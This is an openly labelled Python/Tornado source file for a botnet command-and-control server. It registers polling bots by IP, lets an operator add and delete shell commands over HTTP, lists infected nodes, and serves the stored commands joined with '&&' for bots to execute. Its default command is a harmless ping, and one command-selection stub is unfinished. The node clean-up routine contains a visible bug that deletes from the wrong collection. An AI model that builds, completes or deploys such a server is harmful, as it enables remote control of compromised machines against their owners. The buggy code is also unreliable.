'''
    This is a botnet server implementation.

    Missing:
        a) CommandsService.get_commands implementation
'''


import tornado.ioloop
import tornado.web

import tornado.options
from tornado.options import options, define
import httpagentparser
import json
import time
import os


define('debug', default=True, help="debug mode", type=bool)

class ClientCache():

    def __init__(self):
        self.nodes = {}

    def add_node(self, clientIp, info):
        self.nodes[clientIp] = {
            'last_seen': int(time.time()),
            'info': info
        }

    def clean_up_expired(self):
        nodes_to_delete = []
        for key, values in self.nodes.items():
            if int(time.time()) - values['last_seen'] > 3600:
                nodes_to_delete.append(key)

        for node in nodes_to_delete:
            del nodes_to_delete[node]


class CommandsService():
    @staticmethod
    def get_commands(os, primaryLanguage, clientIp):
       return ''


class MainHandler(tornado.web.RequestHandler):
    """
    """
    def get(self):
        self.render('index.html')


class NodesHandler(tornado.web.RequestHandler):
    """
    """
    def get(self):
        self.write(json.dumps(self.application.clients_cache.nodes))


class CommandHandler(tornado.web.RequestHandler):
    """
    """
    def get(self):
        # list method
        self.write(json.dumps(self.application.commands, ensure_ascii=False))

    def post(self):
        # add method
        key = self.get_argument('key', '')
        command = self.get_argument('command', '')
        self.application.commands[key] = command

    def delete(self):
        # delete method
        key = self.get_argument('key', '')
        if key in self.application.commands:
            del self.application.commands[key]



class BotnetCommandsController(tornado.web.RequestHandler):
    def get(self):
        headers = self.request.headers
        print(headers)
        clientIp = self.request.remote_ip

        clientinfo = {}  # todo
        self.application.clients_cache.add_node(clientIp, clientinfo)
        #commands = CommandsService.get_commands(os, primaryLanguage, clientIp)

        self.write(' && '.join(self.application.commands.values()))


class Application(tornado.web.Application):
    """
    """
    def __init__(self):
        handlers = [
            (r"/commands", BotnetCommandsController),
            (r"/commands_management", CommandHandler),
            (r"/list_nodes", NodesHandler),
            (r"/.*", MainHandler),
            ]

        self.clients_cache = ClientCache()
        self.com_service = CommandsService()

        self.commands = {
            'pingas': 'ping -c 2 google.com'
        }

        settings = dict(
            template_path=os.path.join(os.path.dirname(__file__), "files"),
            static_path=os.path.join(os.path.dirname(__file__), "files"),
            debug=options.debug,
        )

        super(Application, self).__init__(handlers, **settings)


if __name__ == "__main__":
    tornado.options.parse_command_line()
    app = Application()
    app.listen(8080)
    tornado.ioloop.IOLoop.current().start()
